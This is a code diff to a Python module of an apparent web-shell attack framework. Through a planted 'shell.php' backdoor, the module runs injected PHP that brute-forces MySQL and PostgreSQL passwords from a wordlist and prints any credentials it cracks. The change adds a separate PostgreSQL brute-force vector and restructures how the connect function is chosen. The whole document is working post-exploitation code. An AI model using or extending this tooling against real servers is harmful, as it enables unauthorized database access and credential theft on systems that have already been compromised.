@@ -28,14 +28,22 @@ class Sql(ModuleProbe):
     
     support_vectors = VectorList([
             Vector('shell.php', 'check_connect', "(is_callable('$dbms_connect') && print(1)) || print(0);"),
-            Vector('shell.php', 'brute_sql_php', [ """ini_set('mysql.connect_timeout',1);
+            Vector('shell.php', 'mysql', [ """ini_set('mysql.connect_timeout',1);
 foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
-$c=@$dbms_connect("$hostname", "$username", "$pwd");
+$c=@mysql_connect("$hostname", "$username", "$pwd");
 if($c){
 print("+ $username:" . $pwd . "\n");
 break;
 }
-}mysql_close();""", "-post", "{\'$post_field\' : \'$data\' }"])
+}mysql_close();""", "-post", "{\'$post_field\' : \'$data\' }"]),
+            Vector('shell.php', 'postgres', [ """foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
+$c=@pg_connect("host=$hostname user=$username password=" . $pwd . " connect_timeout=1");
+if($c){
+print("+ $username:" . $pwd . "\n");
+break;
+}
+}pg_close();""", "-post", "{\'$post_field\' : \'$data\' }"]),                                  
+                                  
             ])
     
     
@@ -49,12 +57,6 @@ break;
     argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')
 
     def _prepare_probe(self):
-        
-        
-        if self.args['dbms'] == 'mysql':
-            self.args['dbms_connect'] = "mysql_connect"
-        else:
-            self.args['dbms_connect'] = "pg_connect"
         
         
         # Check chunk size
@@ -92,8 +94,10 @@ break;
     
     def _probe(self):
         
-        if self.support_vectors.get('check_connect').execute(self.modhandler, { 'dbms_connect' : self.args['dbms_connect']}) != '1':
-            raise ProbeException(self.name,  '\'%s\' %s' % (self.args['dbms_connect'], WARN_NOT_CALLABLE))
+        dbms_connect = 'mysql_connect' if self.args['dbms'] == 'mysql' else 'pg_connect'
+        
+        if self.support_vectors.get('check_connect').execute(self.modhandler, { 'dbms_connect' : dbms_connect }) != '1':
+            raise ProbeException(self.name,  '\'%s\' %s' % (dbms_connect, WARN_NOT_CALLABLE))
         
         post_field = ''.join(choice(ascii_lowercase) for x in range(4))
         user_pwd_re = compile('\+ (.+):(.+)$')
@@ -102,9 +106,9 @@ break;
         for chunk in self.args['wordlist']:
             
             joined_chunk='\\n'.join(chunk)
-            args_formats = { 'hostname' : self.args['hostname'], 'username' : self.args['username'], 'dbms_connect' : self.args['dbms_connect'], 'post_field' : post_field, 'data' : joined_chunk }
+            args_formats = { 'hostname' : self.args['hostname'], 'username' : self.args['username'], 'post_field' : post_field, 'data' : joined_chunk }
             self.mprint("From '%s' to '%s'..." % (chunk[0], chunk[-1]))
-            result = self.support_vectors.get('brute_sql_php').execute(self.modhandler, args_formats)  
+            result = self.support_vectors.get(self.args['dbms']).execute(self.modhandler, args_formats)  
             if result:
                 user_pwd_matched = user_pwd_re.findall(result)
                 if user_pwd_matched and len(user_pwd_matched[0]) == 2:
